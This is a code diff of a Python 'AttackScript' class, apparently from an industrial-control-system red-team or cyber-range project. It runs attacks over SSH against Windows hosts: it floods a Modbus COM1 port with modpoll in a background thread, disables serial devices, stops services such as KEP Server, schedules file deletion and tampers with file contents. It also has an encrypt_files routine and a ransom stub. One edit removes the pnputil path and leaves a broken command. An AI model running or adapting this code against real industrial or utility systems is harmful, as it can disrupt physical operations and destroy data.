@@ -25,6 +25,7 @@ from scp import SCPClient
 import socket
 import platform
 import subprocess
+import threading
 
 
 class AttackScript:
@@ -134,7 +135,7 @@ class AttackScript:
         # Return the output
         return ssh_output
 
-    def scheduled_task_delete_files(self, folder_path, revert=True) -> None:
+    def scheduled_task_delete_files(self, folder_path, revert=False) -> None:
         """
         # NOTE: This is adapted from the previous team. I dont even know if the smartmeter path even exist tbh
         
@@ -353,11 +354,18 @@ class AttackScript:
         else:
             print("SSH Failed to Disable.\nFail.\n")
 
-    def run_modinterrupt(self) -> None:
+    def run_modinterrupt(self, revert=False) -> None:
         """
         Run modpoll to interrupt COM1 port by disabling KEP Server and then run modpoll indefenitely
         """
-        self.kep_server_stop()
+        if revert:
+            cmd_output = ""
+            cmd_output = self.ssh_run_command("taskkill /IM modpoll.exe /F")
+            if "SUCCESS: " in cmd_output:
+                print("Successfully reverted attack!")
+                return
+            else:
+                raise Exception("Either modpoll.exe doesn't exist or there is something wrong!")
 
         baudrate = self.baudrate_check()
 
@@ -367,13 +375,15 @@ class AttackScript:
 
         check_modpoll = self.ssh_run_command(f"{executable_path} {' '.join(parameters)}")
 
-        ##TODO: Add threading for modinterrupt
+        def run_modpoll_interrupt_cmd():
+            self.ssh_run_command(f"{executable_path} {' '.join(parameters)}")
 
         if "Polling" in check_modpoll:
             print("Modinterrupt is running \nOk.\n")
             parameters = ["-b", baudrate, "-p", "none", "-m", "rtu", "-a", "2", "COM1"]
             try:
-                self.ssh_run_command(f"{executable_path} {' '.join(parameters)}")
+                thread = threading.Thread(target=run_modpoll_interrupt_cmd)
+                thread.start()
             except CalledProcessError as e:
                 print("Error executing the executable file:", e)
         else:
@@ -403,14 +413,13 @@ class AttackScript:
         enable_or_disable = "/disable-device"
         if revert:
             enable_or_disable = "/enable-device"
-        disableCOM = self.ssh_run_command(f'C:\Windows\System32\pnputil.exe {enable_or_disable} "{comPort}"')
+        disableCOM = self.ssh_run_command(f' {enable_or_disable} "{comPort}"')
         self.kep_server_start()
         if "successfully" in disableCOM:
             print(disableCOM)
         else:
             print(disableCOM)
             raise Exception(f"Device not {enable_or_disable.split('-')[0][1:]}d. \nFail.\n")
-        
         
 
     def encrypt_files(self) -> None:
@@ -1543,7 +1552,7 @@ class AttackScript:
                         services_state[service_index] = False
 
                     elif "STOPPED" in command_output:
-                        print(f"{service} has stopped!")
+                        #print(f"{service} has stopped!")
                         services_state[service_index] = True
                     else:
                         print(f"{service} is still stopping... waiting 1 more second [{counter}]")
@@ -1551,7 +1560,7 @@ class AttackScript:
                         sleep(1)
 
             elif "STOPPED" in command_output:
-                print(f"{service} has stopped!")
+                #print(f"{service} has stopped!")
                 services_state[service_index] = True
             else:
                 print(command_output)
@@ -1595,7 +1604,7 @@ class AttackScript:
                         services_state[service_index] = False
 
                     elif "RUNNING" in command_output:
-                        print(f"{service} is running!")
+                        #print(f"{service} is running!")
                         services_state[service_index] = True
                     else:
                         print(f"{service} is still starting up... waiting 1 more second [{counter}]")
@@ -1603,7 +1612,7 @@ class AttackScript:
                         sleep(1)
 
             elif "RUNNING" in command_output:
-                print(f"{service} is running!")
+                #print(f"{service} is running!")
                 services_state[service_index] = True
             else:
                 print(command_output)
@@ -1957,6 +1966,9 @@ class AttackScript:
         # Replace '0' with '1' in the file
         command_replace_zero = self.ssh_run_command(f"pwsh.exe -Command \"(Get-Content -Path \"{command_output[:-1]})\" -replace '0', '1' | Set-Content -Path \"{command_output[:-1]}\"")
         print("Replaced 0 with 1")
+
+    def Ransom(self):
+        return True
 
     ########
     # MAIN #
